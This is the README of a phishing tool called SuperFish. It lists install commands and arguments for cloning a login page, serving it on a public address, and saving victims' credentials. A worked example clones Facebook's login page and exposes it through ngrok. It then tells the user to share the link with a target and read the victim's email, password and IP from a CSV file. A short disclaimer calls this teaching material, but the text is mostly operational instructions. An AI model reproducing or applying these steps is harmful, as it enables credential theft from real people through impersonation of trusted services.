## 👋 It's in beta, I'm still building
----
# How to install
#### Linux and Termux:
- Clone Rp: `git clone https://github.com/J4c5/superfish.git`
- Install the dependencies: `pip3 install -r requirements.txt`

# Arguments and Usage
#### The list of arguments are these:
```sh
--import-template
--local-template
--webserver-port
--webserver-host
--redirect
--output
```
#### Description of each argument
- `--import-template`: import a login template using a url for example: `--import-template=https://facebook.com/login`
- `--local-template`: use a local template that you might have downloaded to an index.html, example: `--local-template=./mytemplate/index.html`
- `--webserver-port`: configure a port for the server the default is 8080, example: `--webserver-port=8082`
- `--webserver-host`: configure a host, the default is: 127.0.0 1, example: `--webserver-host=0.0.0.0`
-  `--redirect`: configure where the victim will be directed to post the phishing, example: `--redirect=https://facebook.com`
-  `--output`: edit the phishing output, if you want in csv use: `--output=csv` or you want text: `--output=text`

### Examples
> ⚠ Warning - Do not use these means for bad things, this tool and author is not responsible for any damage caused. the methods explained here are for the purpose of teaching how the framework works.
#### Clone the facebook login page and create a link to it for everyone:
- 1 Start Ngrok Service: `ngrok http 1337`
- 2 Start SuperFish: `python3 superfish.py --import-template=https://facebook.com/login --redirect=https://facebook.com --webserver-port=1337 --output=csv`
- 3 share the public ngrok link with the target, the link will look like: "https://9470-131-161-179-245.ngrok.io"
- 4 then look in the CSV file, you will see the ip of the email and the password of the victim.

# Terms and Warns
> 1 This tool/author does not take responsibility for damages to third parties, this responsibility is entirely and completely from the user
